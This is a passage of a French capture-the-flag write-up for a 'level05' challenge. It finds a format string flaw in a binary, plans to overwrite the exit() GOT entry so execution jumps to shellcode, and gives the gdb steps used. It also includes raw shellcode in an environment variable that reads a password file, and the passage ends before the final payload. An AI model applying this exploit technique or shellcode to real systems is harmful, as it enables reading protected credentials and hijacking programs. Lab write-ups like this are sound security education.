En examinant le binaire, nous pouvons voir qu'un appel a printf est effectue puis juste apres, un appel a exit.
Le printf ne prenant en parametre seulement notre entree (dans un buffer de 100 bytes) nous pouvons en deduire
qu'une faille format string est presente dans le programme. Pour en avoir le coeur net il suffit d'envoyer
"%x" au binaire, et de voir si une addresse de la stack s'affiche. C'est le cas. Notre programme est 
donc vulnerable aux formats strings.

Le flag du user 06 n'est pas present sur la stack (comme lors d'un precedent level), inutile donc de dumper la memoire.
Nous ne pouvons pas ecraser EIP, car un appel a exit() est fait juste apres notre appel a printf(). 

Un moyen efficace d'exploiter une format string suivie d'un appel a exit(), est d'ecraser l'adresse GOT (Global Offset
Table) de l'appel systeme exit() pour la remplacer par l'adresse d'un eventuel shellcode stocke sur la stack. (la stack
etant executable ici...)

Commencons par recuperer l'adresse nous permettant de reecrire sur la GOT :

	$ gdb level05
	$ disas main
	$ disas 0x8048370
	$ x 0x80497e0

Nous avons donc l'adresse necessaire: 0x80497e0

Maintenant nous allons stocke notre shellcode dans une variable d'environnement et recuperer son adresse. 

	export TOTO=$(python -c "print('\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass')")


